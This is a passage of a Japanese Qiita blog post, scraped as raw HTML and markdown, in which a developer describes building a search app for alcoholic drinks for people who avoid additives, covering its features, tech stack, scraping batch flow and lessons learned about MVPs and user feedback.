srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca065560-b864-49f3-841c-be94c2d1d011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=337d8dbb202ac991d9a6c0ba2acae078 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca065560-b864-49f3-841c-be94c2d1d011.png\" loading=\"lazy\"></a>\n</div>\n<h3 data-sourcepos=\"110:1-110:28\">\n<span id=\"バッチのフロー図\" class=\"fragment\"></span><a href=\"#%E3%83%90%E3%83%83%E3%83%81%E3%81%AE%E3%83%95%E3%83%AD%E3%83%BC%E5%9B%B3\"><i class=\"fa fa-link\"></i></a>バッチのフロー図</h3>\n<p data-sourcepos=\"111:1-111:200\">開発中は10データほど手動で投入して行っていましたが、データ数を増やすにあたり、同じように投入するのは現実的でない、面倒だと思いました。</p>\n<p data-sourcepos=\"113:1-113:237\">Puppeteerでスクレイピング、取得した情報を元に、ClaudeAPIを使って詳細情報（おすすめレシピ、ペアリングや飲み方）を考えてもらい、データを登録する仕組みを作成しました。</p>\n<iframe id=\"qiita-embed-content__73eb8fe19b4058cb0425033cc4826982\" src=\"https://qiita.com/embed-contents/mermaid#qiita-embed-content__73eb8fe19b4058cb0425033cc4826982\" style=\"width:100%;\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" data-content='{\"data\":\"flowchart TD\\n A[Start] --&gt; B[Puppeteerでブラウザを起動]\\n B --&gt; C[メーカーサイトにアクセス]\\n C --&gt; D[商品情報をスクレイピング]\\n D --&gt; E[商品データ配列を返却]\\n E --&gt; F[Claude APIでレコメンド情報を生成]\\n F --&gt; G[商品データをSupabaseに登録]\\n G --&gt; H[レコメンド情報をSupabaseに登録]\\n H --&gt; I[End]\",\"key\":\"0018664ed83c49fdd9fee24c467098e2\"}'>\n</iframe>\n\n<h1 data-sourcepos=\"129:1-129:47\">\n<span id=\"初めての個人開発から得た気づき\" class=\"fragment\"></span><a href=\"#%E5%88%9D%E3%82%81%E3%81%A6%E3%81%AE%E5%80%8B%E4%BA%BA%E9%96%8B%E7%99%BA%E3%81%8B%E3%82%89%E5%BE%97%E3%81%9F%E6%B0%97%E3%81%A5%E3%81%8D\"><i class=\"fa fa-link\"></i></a>初めての個人開発から得た気づき</h1>\n<h2 data-sourcepos=\"130:1-130:116\">\n<span id=\"1-アイデア出しが非常に難しい価値を届けるプロダクトを作ることの難しさ\" class=\"fragment\"></span><a href=\"#1-%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A2%E5%87%BA%E3%81%97%E3%81%8C%E9%9D%9E%E5%B8%B8%E3%81%AB%E9%9B%A3%E3%81%97%E3%81%84%E4%BE%A1%E5%80%A4%E3%82%92%E5%B1%8A%E3%81%91%E3%82%8B%E3%83%97%E3%83%AD%E3%83%80%E3%82%AF%E3%83%88%E3%82%92%E4%BD%9C%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AE%E9%9B%A3%E3%81%97%E3%81%95\"><i class=\"fa fa-link\"></i></a>1. アイデア出しが非常に難しい<br>（価値を届けるプロダクトを作ることの難しさ）</h2>\n<p data-sourcepos=\"131:1-133:192\"><code>1から何かを作ってみたいけど、何を作ったらいいかわからない</code>状態からスタートしました。<br>\n思いついても、<code>大抵は既に世の中にあるものと被っています。</code><br>\n自分が作ったサービスやプロダクトでしか提供できない、そのサービスを使わなければいけないものを作ることは本当に難しいと思いました。</p>\n<p data-sourcepos=\"135:1-135:180\">コミュニティ内で壁打ちしてもらいつつ考えたアイデアのため、正直今もアイデアを考えられるようになった！とは思っていません。</p>\n<p data-sourcepos=\"137:1-137:334\">ただ日々の中で、<strong>今世の中にないもの、新しい組み合わせは何かないか、今使っているもので、こんなものがあったらいいのに、エンジニア以外の人が使ってみたいと思えるものは何だろう？などを考える癖がつくようになった</strong>と感じています。</p>\n<p data-sourcepos=\"139:1-139:289\">以前は「技術的に実装が面白そう」「プロダクトを作りたい」という視点で考えがちでしたが、<b>「エンジニア以外の家族や友人が本当に困っていることは何か」</b>を考えることも大切だと思うようになりました。</p>\n<h2 data-sourcepos=\"141:1-141:90\">\n<span id=\"2-完璧な計画よりもまずは価値を届けることの大切さを知る\" class=\"fragment\"></span><a href=\"#2-%E5%AE%8C%E7%92%A7%E3%81%AA%E8%A8%88%E7%94%BB%E3%82%88%E3%82%8A%E3%82%82%E3%81%BE%E3%81%9A%E3%81%AF%E4%BE%A1%E5%80%A4%E3%82%92%E5%B1%8A%E3%81%91%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AE%E5%A4%A7%E5%88%87%E3%81%95%E3%82%92%E7%9F%A5%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2. 完璧な計画よりもまずは「価値」を届けることの大切さを知る</h2>\n<p data-sourcepos=\"143:1-145:80\">これまでの業務を通して、<strong>見積もりからリリースまでどのくらいかかるか厳密に見積り、スケジュール通りに進めることが当たり前</strong>だと思っていました。<br>\nアイデア出しをした当初、実際にプロダクトを作るまでにどんな機能を作るか、完成までにどの位の期間がかかるか一通り考え、スケジュールもかっちり作ろうとしてました。<br>\nここで、コミュニティの教えから<code>MVP</code>の考え方を知ります。</p>\n<p data-sourcepos=\"147:1-147:78\"><strong><a href=\"https://monstar-lab.com/dx/about/about-mvp/\" rel=\"nofollow noopener\" target=\"_blank\">参考サイト</a>より引用</strong></p>\n<blockquote data-sourcepos=\"148:1-149:236\">\n<p data-sourcepos=\"148:3-148:126\">MVP（Minimum Viable Product）とは、ユーザーに必要最小限の価値を提供できるプロダクトのこと。</p>\n<blockquote data-sourcepos=\"149:2-149:236\">\n<p data-sourcepos=\"149:3-149:236\">一般的には、目的を達成できる最低限の状態の製品やサービスをユーザーに提供し、得られたフィードバックを参考に新機能の追加や改善を繰り返すMVP開発で活用されます。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"151:1-152:109\">最初は、<code>MVPはどのように作ったらいいの？最小で価値を提供するとはどういうこと？</code>状態でした。<br>\n調べていくうちに、<code>ユーザーストーリー</code>と<code>受け入れ基準</code>の概念を知りました。</p>\n<p data-sourcepos=\"154:1-154:109\"><strong><a href=\"https://aslead.nri.co.jp/products/miro/column/miro-user-story-mapping.html\" rel=\"nofollow noopener\" target=\"_blank\">参考サイト</a>より引用</strong></p>\n<blockquote data-sourcepos=\"155:1-155:118\">\n<p data-sourcepos=\"155:2-155:118\">「〇〇（ユーザー）として、✕✕（行動）をしたい。それは、▲▲（目的）だからだ」</p>\n</blockquote>\n<p data-sourcepos=\"157:1-157:159\">実際に使う人の立場になってユーザーストーリーを作成、どうすれば実現できるのか受け入れ基準を書きだしました。</p>\n<details><summary><b>考えたユーザーストーリーと受け入れ基準</b></summary>\n<div class=\"code-frame\" data-lang=\"md\" data-sourcepos=\"161:1-198:3\"><div class=\"highlight\"><pre><code><span class=\"gu\">## 1.人工甘味料や着色料を避けたい</span>\n「添加物を気にしている人は、添加物が入っていないお酒を成分表示からすぐに確認したい、なぜなら体に良くないといわれているものを摂取したくないからだ」\n他にも考えられるロール：健康意識の高い人、添加物を気にしている人\n他にも考えられるなぜ：添加物が入っていないお酒やチューハイが飲みたいから\n\n<span class=\"gs\">**受け入れ基準**</span>\n商品名検索で5秒以内に結果が表示される\n添加物の有無が「あり/なし」で明確に表示される\nある場合は具体的な添加物名と種類（着色料・甘味料など）が表示される\nデータがない商品は「情報なし」と表示される\n\n<span class=\"gu\">## 2. 定期的な新発見</span>\n「お酒を飲む人は定期的に添加物の少ない新しいお酒を探したい。なぜなら健康に配慮しながらも新しいお酒を知りたい・同じお酒ばかり飲んでマンネリ化することを避けたいからだ」\n\n<span class=\"gs\">**受け入れ基準**</span>\n最近追加された商品が「新着」として表示される\nカテゴリー別（ビール、チューハイなど）に添加物の少ないお酒が表示される\n\n<span class=\"gu\">## 3.飲み会での選択</span>\n「社交の場に参加する健康志向者として、私はその場で提供されているドリンクの中から添加物の少ないものを素早く識別したい。なぜなら周囲に気を遣いつつ自分の健康も守りたいからだ」\n\n<span class=\"gs\">**受け入れ基準**</span>\n検索結果に添加物の有無が視覚的に分かりやすく（色やアイコン）表示される\n例：添加物なし→緑のチェックマーク、あり→黄色の注意アイコン\n添加物の種類（着色料、甘味料など）でフィルタリングができる\n居酒屋などでよく提供される一般的なお酒のリストを素早く閲覧できる\n\n<span class=\"gu\">## 4.アレルゲン情報</span>\n「アレルギー持ちの飲酒者として、私は特定のアレルゲンを含まないお酒だけを表示したい。なぜなら安全に楽しむための選択肢を知りたいからだ」\n\n<span class=\"gs\">**受け入れ基準**</span>\n主要アレルゲン（小麦、大豆など）でのフィルタリングが可能\n複数のアレルゲンを同時に除外検索できる\nアレルゲン情報がない商品は「情報なし」と明示される\nアレルゲンの詳細説明（なぜ含まれているか）が表示される\n\n</code></pre></div></div>\n</details>\n<p data-sourcepos=\"201:1-201:173\">完璧なものを完成させようとせず、まずは小さい機能単位で、<strong>問題を解決する</strong>、<strong>価値を届ける</strong>ことの大切さを学びました。</p>\n<h2 data-sourcepos=\"203:1-203:114\">\n<span id=\"3-自己満足になっていないか不安との戦いフィードバックをもらうことの大切さ\" class=\"fragment\"></span><a href=\"#3-%E8%87%AA%E5%B7%B1%E6%BA%80%E8%B6%B3%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%8B%E4%B8%8D%E5%AE%89%E3%81%A8%E3%81%AE%E6%88%A6%E3%81%84%E3%83%95%E3%82%A3%E3%83%BC%E3%83%89%E3%83%90%E3%83%83%E3%82%AF%E3%82%92%E3%82%82%E3%82%89%E3%81%86%E3%81%93%E3%81%A8%E3%81%AE%E5%A4%A7%E5%88%87%E3%81%95\"><i class=\"fa fa-link\"></i></a>3. 自己満足になっていないか不安との戦い、フィードバックをもらうことの大切さ</h2>\n<p data-sourcepos=\"204:1-204:215\">作成中、自分が作りたいものと、世の中で必要とされているものにギャップがあるのではないか、<code>これって自己満じゃない？</code>と思うことが何度もありました。</p>\n<p data-sourcepos=\"206:1-207:210\">開発中はMVP毎に、コミュニティの人にフィードバックをもらうようにしました。<br>\n最初は、フィードバックをもらうことを恐れていましたが、そもそも使ってもらわないとわからないよね？となりフィードバックをもらうようにしました。</p>\n<p data-sourcepos=\"209:1-209:193\">フィードバックをもらって思ったことは、<strong>自分が満足した状態でも、実際に使ってもらうことで気づかなかった指摘をいただける</strong>ことです。</p>\n<p data-sourcepos=\"211:1-211:225\">自分で動作確認する際は同じ操作を無意識に行っていたため、気づけなかったバグがたくさんありました。指摘をいただくことで操作性を向上することができました。</p>\n<p data-sourcepos=\"213:1-213:307\">ありがたいことにもっとこうしたほうがいいよ、この機能追加したらいいのでは？などのアドバイスをいただき、<strong>自分では思いつかなかった新しい観点や考えを取り入れられる、より使いやすいものにする</strong>ことができました。</p>\n<h2 data-sourcepos=\"215:1-215:57\">\n<span id=\"4-キャッチアップの目的意識が変わった\" class=\"fragment\"></span><a href=\"#4-%E3%82%AD%E3%83%A3%E3%83%83%E3%83%81%E3%82%A2%E3%83%83%E3%83%97%E3%81%AE%E7%9B%AE%E7%9A%84%E6%84%8F%E8%AD%98%E3%81%8C%E5%A4%89%E3%82%8F%E3%81%A3%E3%81%9F\"><i class=\"fa fa-link\"></i></a>4. キャッチアップの目的意識が変わった</h2>\n<p data-sourcepos=\"216:1-216:377\">今まで、Udemyの視聴や書籍を読む、サンプルアプリを作っていた段階では<code>明確なゴールがなく、こんな技術の使い方があるんだなあ、こういう流れで開発を進めるんだなあ</code>というざっくりとした印象で、<strong>課題解決のための引き出しを増やすこと以外に目的がありませんでした。</strong></p>\n<p data-sourcepos=\"218:1-218:238\">実際に1からプロダクトを作ってみて、もっとこうしたい、ここを変えたい！でも解決方法を調べないとわからない、調べてもしっくりこない状態が開発中に何度もありました。</p>\n<p data-sourcepos=\"220:1-220:248\">ここ最近のインプットやアウトプット活動で、<code>検索アプリでこの機能作ったけど、この技術やコードの書き方を知っていればもっといいものになったかも</code>と思えるようになりました。</p>\n<p data-sourcepos=\"222:1-222:277\">また、新しい概念を理解しようとする際には、<strong>今から私は何を勉強して、どう応用できるのか（プロダクトの作成に活かせるのか）を考えながらキャッチアップをする</strong>ことを心掛けるようになりました。</p>\n<h1 data-sourcepos=\"224:1-224:26\">\n<span id=\"今後の展望と課題\" class=\"fragment\"></span><a href=\"#%E4%BB%8A%E5%BE%8C%E3%81%AE%E5%B1%95%E6%9C%9B%E3%81%A8%E8%AA%B2%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>今後の展望と課題</h1>\n<p data-sourcepos=\"225:1-225:127\">1ヶ月での開発だったため、改善の余地があります。特にバッチ処理の安定化が次の目標です。</p>\n<h4 data-sourcepos=\"227:1-227:23\">\n<span id=\"機能面の改善\" class=\"fragment\"></span><a href=\"#%E6%A9%9F%E8%83%BD%E9%9D%A2%E3%81%AE%E6%94%B9%E5%96%84\"><i class=\"fa fa-link\"></i></a>機能面の改善</h4>\n<ul data-sourcepos=\"228:1-234:0\">\n<li data-sourcepos=\"228:1-228:212\">\n<p data-sourcepos=\"228:3-228:212\"><strong>ページング改善:</strong> データ数を増やした結果、全件表示したときに全て一つのページで表示されています。10 件ずつ表示などでもっと見やすくしたいです。</p>\n</li>\n<li data-sourcepos=\"229:1-229:203\">\n<p data-sourcepos=\"229:3-229:203\"><strong>データ数を増やしたい:</strong> カテゴリーがカクテル、ビール、チューハイのみのため、ワインや日本酒など様々な種類を検索できるようにしたいです。</p>\n</li>\n<li data-sourcepos=\"230:1-231:0\">\n<p data-sourcepos=\"230:3-230:377\"><strong>アレルゲンでのフィルタリング:</strong> ユーザーストーリーを考えたときに、添加物だけではなくアレルギー持ちの方向けに特定の原材料でフィルタリングもできたらいいなと考えていました。期間を考え優先度をさげましたが、原材料フィルタリングも追加したいと考えています。</p>\n</li>\n<li data-sourcepos=\"232:1-234:0\">\n<p data-sourcepos=\"232:3-233:154\"><strong>バッチ機能の向上:</strong> 現在Puppeteerで特定のサイトから自動データ収集をするように作成しています。もっと様々の種類の情報を収集ができるように精度をあげたいです。<br>\n安定したら、ワークフローからcron実行して週に１度実行、定期的に商品を増やせるようにしたいと考えています。</p>\n</li>\n</ul>\n<h1 data-sourcepos=\"235:1-235:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"236:1-237:136\">自分が抱えていた<code>勉強しているのに何も作れない</code>状態をまずは脱却できたと思っています。<br>\n2年くらい悩んでいましたが、学習方法を変えてから約５か月で脱却できたことは本当に嬉しいです。</p>\n<p data-sourcepos=\"239:1-240:96\">まだまだ技術力、プロダクトを作成するにあたり、知識が不足しています。<br>\nしかし、まずは作ることができた自分を素直に褒めたいと思いました。</p>\n<p data-sourcepos=\"242:1-242:230\">今後は、ただ作るだけではなく、<code>これがないと困る！これがあってよかった！</code>と思ってもらえるようなプロダクト作りができるようになるよう日々学習をしていきます。</p>\n<h1 data-sourcepos=\"245:1-245:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"246:1-246:43\"><iframe id=\"qiita-embed-content__3b881ece861daf16842b1e06a2f6a1ff\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3b881ece861daf16842b1e06a2f6a1ff\" data-content=\"https%3A%2F%2Fmonstar-lab.com%2Fdx%2Fabout%2Fabout-mvp%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"248:1-248:275\"><iframe id=\"qiita-embed-content__a9f7e7d3cd4f733efb563e47c98d0f9e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a9f7e7d3cd4f733efb563e47c98d0f9e\" data-content=\"https%3A%2F%2Fqiita.com%2Fokikusan-public%2Fitems%2F527263d4eb28f7015ca9%23%3A%7E%3Atext%3D2024%252D03%252D17-%2C%25E3%2583%25A6%25E3%2583%25BC%25E3%2582%25B6%25E3%2583%25BC%25E3%2582%25B9%25E3%2583%2588%25E3%2583%25BC%25E3%2583%25AA%25E3%2583%25BC%25E3%2581%25A8%25E3%2581%25AF%2C%25E3%2581%2599%25E3%2582%258B%25E3%2581%2593%25E3%2581%25A8%25E3%2581%258C%25E3%2581%25A7%25E3%2581%258D%25E3%2581%25BE%25E3%2581%2599%25E3%2580%2582\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"250:1-250:74\"><iframe id=\"qiita-embed-content__851e7c0d1be889d78acbf5c68e6e54fd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__851e7c0d1be889d78acbf5c68e6e54fd\" data-content=\"https%3A%2F%2Faslead.nri.co.jp%2Fproducts%2Fmiro%2Fcolumn%2Fmiro-user-story-mapping.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"252:1-252:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"253:1-256:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"258:1-258:19\"><iframe id=\"qiita-embed-content__a39f0b4bb2b673511cf7952ce860b138\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a39f0b4bb2b673511cf7952ce860b138\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n初めて、個人開発に挑戦しました！「アイデア出し⇒MVP作成⇒プロダクト作成」を自力で行い、作りたいものを作るということに挑戦、やり遂げることができました。\nこの記事では、作成過程や開発初心者が0→1で作れるようになるまでに得た気づきを書きたいと思います。\n\n# 作ったものの紹介\n## 添加物が気になる人のためのお酒検索アプリ🍶\n\n<div align=\"center\">\n<img width=\"400\" src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b5721a90-55a9-433b-a2ab-c3a1db6f1b6d.png\">\n</div>\n\n### なぜ作ったのか\n\nニッチです。添加物って何？と思う方もいらっしゃるのではないでしょうか。\n\n**商品を手に取らないと添加物がわからない**\n私は、お酒が大好きです。\nその一方で、食品や飲み物を買うときに添加物が入りすぎていないか気になってしまいます。スーパーで缶チューハイを手にとっては成分表を眺めていました。\n\n**添加物が入っていないものを調べるのに手間がかかる**\n趣味で加入しているトレーニングサロンの集まりで、意外と添加物を気にしている人は多い印象がありました。`食品を手に取った際は成分表を見てしまう、ないものを探すのが大変`との意見もありました。公式サイトなどで調べることもできますが、調べるにも`検索→商品情報や成分表のページを探す→入っているか確認する`手間がかかります。\n\n健康に気を使っている人や、特定の原材料を避けたい人も一定数いることはわかっていましたが、現状簡単に調べられるものが少ないと感じていました。\n\n**毎回同じものを選んでしまう**\nシンプルなもので作られているドリンク（ウォッカと果汁のみなど）を買いたいなと思いつつもあまりなく、見つけることが難しいです。そのため同じドリンクを選びがちでした。\n\n### なぜ添加物を気にする人がいるのか\n私は人工甘味料が入った飲み物やお菓子を摂取しすぎると、お腹がゆるく感じることがありました。\nなるべく人工甘味料が入っていない飲み物を選びたいと思ったことが、添加物を気にするきっかけでした。\n\nトレーニングサロンのメンバーからは、様々な意見を聞きました。\n* 小さいころからアレルギーやアトピーで悩んでいて、特定のものを避けたい\n* 子どもの体調を気にかけて、避ける傾向にある\n* 発がん性があったり、負担があったりと何となく不安\n* なるべく自然由来の物を摂りたい\n\n科学的な意見は様々あり、食品の安全性を保つためにも添加物は必要とはわかっているものの、気にする人が一定数いることも事実です。\nそういった方々が安心して選べるようにしたいと思いました。\n\n\n### このアプリでどのように解決できるのか\n\n上記の問題を解決するために、<b>「簡単に添加物有無がわかる」「添加物がない・少ないお酒を簡単に調べられる」「自分の希望にあう新しいお酒に出会える」</b>ことを目指して作成しました。\n\n**「商品を手に取らないと添加物がわからない」**\n商品カードに添加物有無のアイコンと添加物情報欄を設け、簡単に「添加物有無」と「添加物情報」がわかるようにしました。\n\n→毎回お酒を手にとって確認する必要がなくなります。\n\n<div align=\"center\">\n<img width=\"200\" src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b3aa3e7e-b6f1-4016-a1ce-0a34a8d463d0.png\">\n</div>\n\n**「添加物が入っていないものを調べるのに手間がかかる」**\n検索項目が多いと簡単に調べられない/手間が増えると考えていました。\nメインの検索フォームには商品名と添加物有無のフィルター項目のみ設け、「添加物あり/なし」、「気になる商品に添加物があるか」に特化しました。\n\n→添加物がない・少ないお酒を簡単に調べられます。\n\n<div align=\"center\">\n<img src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3701fb25-81ae-47bc-9efd-76a89f817420.png\">\n</div>\n\n\n**「毎回同じものを選んでしまう」**\n様々な飲料メーカーのサイトから情報を収集し、豊富なデータを揃えるようにしました。\n\n→いつも同じものを選んでしまうことを解決、新しいお酒を見つけることができるようにしました。\n\n## 機能概要\n### 1. 添加物チェック\n各カードに添加物有無のアイコンをつけて一目でわかる、\nカード内では添加物情報を設け、気になるものが入っていないかわかるようにしました。\n\n### 2. 検索機能\n**商品名・添加物有無で検索：** お酒の商品名、添加物有無で気軽に検索\n**詳細検索：** 特定の添加物や添加物名称、主要な飲料メーカーで絞りこみ\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74e431cf-a27e-46df-b917-d5e5852edb6d.png)\n\n\n### 3. お酒情報詳細\n添加物以外にも、健康志向の人に向けた情報を追加しました。\nアルコール度数、糖質量、カロリー、おすすめレシピやペアリングなども紹介できるようにしました。\n\n<div align=\"center\">\n<img width=\"300\" src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/814e3145-8a15-4456-85dc-d354d50b7884.png\">\n</div>\n\n### 4. 自動データ登録バッチ\n定期的に新しい情報や商品情報を収集、登録できればと思い、バッチコマンド実行で、メーカーサイトから情報を収集、登録できるようにしました。\n\n\n## 技術スタック\n| カテゴリ | 技術 |\n|:-:|:-:|\n| フロントエンド  | TypeScript, React, Tailwind CSS, Vite |\n| バックエンド/DB  | Supabase, TypeScript  |\n| デプロイ | Firebase  |\n| テスト  | Jest, React Testing Library |\n| CICD |  GitHub Actions |\n| 他  | Claude API, puppeteer  |\n\n### テーブル構成\n<div align=\"center\">\n<img width=\"600\" src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca065560-b864-49f3-841c-be94c2d1d011.png\">\n</div>\n\n### バッチのフロー図\n開発中は10データほど手動で投入して行っていましたが、データ数を増やすにあたり、同じように投入するのは現実的でない、面倒だと思いました。\n\nPuppeteerでスクレイピング、取得した情報を元に、ClaudeAPIを使って詳細情報（おすすめレシピ、ペアリングや飲み方）を考えてもらい、データを登録する仕組みを作成しました。\n\n\n```mermaid\nflowchart TD\n    A[Start] --> B[Puppeteerでブラウザを起動]\n    B --> C[メーカーサイトにアクセス]\n    C --> D[商品情報をスクレイピング]\n    D --> E[商品データ配列を返却]\n    E --> F[Claude APIでレコメンド情報を生成]\n    F --> G[商品データをSupabaseに登録]\n    G --> H[レコメンド情報をSupabaseに登録]\n    H --> I[End]\n```\n\n\n# 初めての個人開発から得た気づき\n## 1. アイデア出しが非常に難しい<br/>（価値を届けるプロダクトを作ることの難しさ）\n`1から何かを作ってみたいけど、何を作ったらいいかわからない`状態からスタートしました。\n思いついても、`大抵は既に世の中にあるものと被っています。`\n自分が作ったサービスやプロダクトでしか提供できない、そのサービスを使わなければいけないものを作ることは本当に難しいと思いました。\n\nコミュニティ内で壁打ちしてもらいつつ考えたアイデアのため、正直今もアイデアを考えられるようになった！とは思っていません。\n\nただ日々の中で、**今世の中にないもの、新しい組み合わせは何かないか、今使っているもので、こんなものがあったらいいのに、エンジニア以外の人が使ってみたいと思えるものは何だろう？などを考える癖がつくようになった**と感じています。\n\n以前は「技術的に実装が面白そう」「プロダクトを作りたい」という視点で考えがちでしたが、<b>「エンジニア以外の家族や友人が本当に困っていることは何か」</b>を考えることも大切だと思うようになりました。\n\n## 2. 完璧な計画よりもまずは「価値」を届けることの大切さを知る\n\nこれまでの業務を通して、**見積もりからリリースまでどのくらいかかるか厳密に見積り、スケジュール通りに進めることが当たり前**だと思っていました。\nアイデア出しをした当初、実際にプロダクトを作るまでにどんな機能を作るか、完成までにどの位の期間がかかるか一通り考え、スケジュールもかっちり作ろうとしてました。\nここで、コミュニティの教えから`MVP`の考え方を知ります。\n\n**[参考サイト](https://monstar-lab.com/dx/about/about-mvp/)より引用**\n> MVP（Minimum Viable Product）とは、ユーザーに必要最小限の価値を提供できるプロダクトのこと。\n>>一般的には、目的を達成できる最低限の状態の製品やサービスをユーザーに提供し、得られたフィードバックを参考に新機能の追加や改善を繰り返すMVP開発で活用されます。\n\n最初は、`MVPはどのように作ったらいいの？最小で価値を提供するとはどういうこと？`状態でした。\n調べていくうちに、`ユーザーストーリー`と`受け入れ基準`の概念を知りました。\n\n**[参考サイト](https://aslead.nri.co.jp/products/miro/column/miro-user-story-mapping.html)より引用**\n>「〇〇（ユーザー）として、✕✕（行動）をしたい。それは、▲▲（目的）だからだ」\n\n実際に使う人の立場になってユーザーストーリーを作成、どうすれば実現できるのか受け入れ基準を書きだしました。\n\n<details><summary><b>考えたユーザーストーリーと受け入れ基準</b></summary>\n\n```md\n## 1.人工甘味料や着色料を避けたい\n「添加物を気にしている人は、添加物が入っていないお酒を成分表示からすぐに確認したい、なぜなら体に良くないといわれているものを摂取したくないからだ」\n他にも考えられるロール：健康意識の高い人、添加物を気にしている人\n他にも考えられるなぜ：添加物が入っていないお酒やチューハイが飲みたいから\n\n**受け入れ基準**\n商品名検索で5秒以内に結果が表示される\n添加物の有無が「あり/なし」で明確に表示される\nある場合は具体的な添加物名と種類（着色料・甘味料など）が表示される\nデータがない商品は「情報なし」と表示される\n\n## 2. 定期的な新発見\n「お酒を飲む人は定期的に添加物の少ない新しいお酒を探したい。なぜなら健康に配慮しながらも新しいお酒を知りたい・同じお酒ばかり飲んでマンネリ化することを避けたいからだ」\n\n**受け入れ基準**\n最近追加された商品が「新着」として表示される\nカテゴリー別（ビール、チューハイなど）に添加物の少ないお酒が表示される\n\n## 3.飲み会での選択\n「社交の場に参加する健康志向者として、私はその場で提供されているドリンクの中から添加物の少ないものを素早く識別したい。なぜなら周囲に気を遣いつつ自分の健康も守りたいからだ」\n\n**受け入れ基準**\n検索結果に添加物の有無が視覚的に分かりやすく（色やアイコン）表示される\n例：添加物なし→緑のチェックマーク、あり→黄色の注意アイコン\n添加物の種類（着色料、甘味料など）でフィルタリングができる\n居酒屋などでよく提供される一般的なお酒のリストを素早く閲覧できる\n\n## 4.アレルゲン情報\n「アレルギー持ちの飲酒者として、私は特定のアレルゲンを含まないお酒だけを表示したい。なぜなら安全に楽しむための選択肢を知りたいからだ」\n\n**受け入れ基準**\n主要アレルゲン（小麦、大豆など）でのフィルタリングが可能\n複数のアレルゲンを同時に除外検索できる\nアレルゲン情報がない商品は「情報なし」と明示される\nアレルゲンの詳細説明（なぜ含まれているか）が表示される\n\n```\n</details>\n\n完璧なものを完成させようとせず、まずは小さい機能単位で、**問題を解決する**、**価値を届ける**ことの大切さを学びました。\n\n## 3. 自己満足になっていないか不安との戦い、フィードバックをもらうことの大切さ\n作成中、自分が作りたいものと、世の中で必要とされているものにギャップがあるのではないか、`これって自己満じゃない？`と思うことが何度もありました。\n\n開発中はMVP毎に、コミュニティの人にフィードバックをもらうようにしました。\n最初は、フィードバックをもらうことを恐れていましたが、そもそも使ってもらわないとわからないよね？となりフィードバックをもらうようにしました。\n\nフィードバックをもらって思ったことは、**自分が満足した状態でも、実際に使ってもらうことで気づかなかった指摘をいただける**ことです。\n\n自分で動作確認する際は同じ操作を無意識に行っていたため、気づけなかったバグがたくさんありました。指摘をいただくことで操作性を向上することができました。\n\nありがたいことにもっとこうしたほうがいいよ、この機能追加したらいいのでは？などのアドバイスをいただき、**自分では思いつかなかった新しい観点や考えを取り入れられる、より使いやすいものにする**ことができました。\n\n## 4. キャッチアップの目的意識が変わった\n今まで、Udemyの視聴や書籍を読む、サンプルアプリを作っていた段階では`明確なゴールがなく、こんな技術の使い方があるんだなあ、こういう流れで開発を進めるんだなあ`というざっくりとした印象で、**課題解決のための引き出しを増やすこと以外に目的がありませんでした。**\n\n実際に1からプロダクトを作ってみて、もっとこうしたい、ここを変えたい！でも解決方法を調べないとわからない、調べてもしっくりこない状態が開発中に何度もありました。\n\nここ最近のインプットやアウトプット活動で、`検索アプリでこの機能作ったけど、この技術やコードの書き方を知っていればもっといいものになったかも`と思えるようになりました。\n\nまた、新しい概念を理解しようとする際には、**今から私は何を勉強して、どう応用できるのか（プロダクトの作成に活かせるのか）を考えながらキャッチアップをする**ことを心掛けるようになりました。\n\n# 